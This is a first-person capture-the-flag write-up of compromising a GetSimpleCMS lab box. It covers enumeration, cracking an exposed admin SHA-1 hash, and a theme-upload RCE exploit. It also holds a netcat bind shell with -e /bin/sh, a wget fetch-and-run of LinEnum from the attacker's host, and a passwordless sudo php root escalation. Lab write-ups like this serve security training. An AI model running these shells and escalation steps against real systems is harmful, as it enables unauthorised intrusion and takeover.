# GetSimpleCMS Box Write-Up
**Date:** `2025-05-16`

**Target IP:** `10.10.10.123`  

---

## Enumeration
I was given an IP address, and the goal was to find a root.txt file.

I begun enumeration through simple scans using whatweb as nmap to see where I should start first. 

1. **Nmap scan**  
```bash
nmap -sC -sV -oA nmap/initial 10.10.10.123
```
- Discovered ports 80 (HTTP) and 22 this lead to me thinking it's a web application I should be exploiting. So I ran a gobuster scan to see what I could do.

2. **Web-app Discovery (Gobuster)**
```bash 
gobuster dir \
  -u http://10.10.10.123/ \
  -w /usr/share/wordlists/dirb/common.txt \
  -x php,html,txt,bak \
  -o gobuster/root.txt

gobuster dir \
  -u http://10.10.10.123/ \
  -w /usr/share/wordlists/dirb/common.txt \
  -x php,html \
  -o gobuster/admin.txt
```
- Found /admin/
    - Led to a page where I could log in, but had to find the credentials. After doing more dirbuster scans to find subdirectories, I found /data/users.xml and it contained the following.
```xml
<user>
  <username>admin</username>
  <password>d033e22ae348aeb5660fc2140aec35850c4da997</password>
</user>
```
I knew that password was hashed, so I cracked the hash after discovering it was SHA-1. I used the following.
```bash
echo 'd033e22ae348aeb5660fc2140aec35850c4da997' | \
  hashcat -m 100 -a 0 rockyou.txt
# or simply recognize it’s SHA-1("admin")
```
After realizing the hash turned out to be admin, I went to try the login on the /admin/ on firefox and it was successful!

The next step was to work on site-mapping and finding the most obvious place to search for vulnerabilities. Working through portswigger labs helped me identify a flaw I could exploit under a "Theme" upload feature. I also googled common CVE related to GetSimpleCMS 3.3.15, and found that there was a vulnerability relating to the .php in themes, so my assumption was right. Doing more research, I found this github that allowed for a RCE. 

https://github.com/cybersecaware/GetSimpleCMS-RCE/tree/main

After cloning the git, it prompted for the server url, along with the command I wanted to run. 

```bash
# On the “server” side
busybox nc -l -p 9001 -e /bin/sh
```
I set this up to spawn a shell from the exploit.py file,
and on my local machine i ran

```bash
# On your machine
busybox nc (myip) 9001
```
And I was able to set up RCE. on the server. Using whoami, I found out I had basic permissions so I had to find a way to escalate.

I ran LinEnum.sh, and discovered there was possible sudo pwnage through /usr/bin/php.
```bash
wget http://10.10.14.5/linenum.sh
chmod +x linenum.sh
./linenum.sh | tee linenum.log
```

LinEnum revealed /usr/bin/php is sudo-able by www-data without password.
To spawn the root shell I used

```bash
CMD="/bin/sh"
sudo /usr/bin/php -r "system('$CMD');"
```
After running these commands, I found out whoami -> root. So it was a successful. The last thing to do was to find the root.txt and submit the flag.

```bash
find / -name root.txt 2>/dev/null
cat /root/root.txt
```

## Lessons Learned
- Virtual hosts may require correct Host: headers; use /etc/hosts or curl -H to target the right site

- Plugin/theme upload features often introduce RCE; always check CVE databases

- Sudo misconfigurations (e.g. allowing PHP) are common privilege-escalation paths; check sudo -l early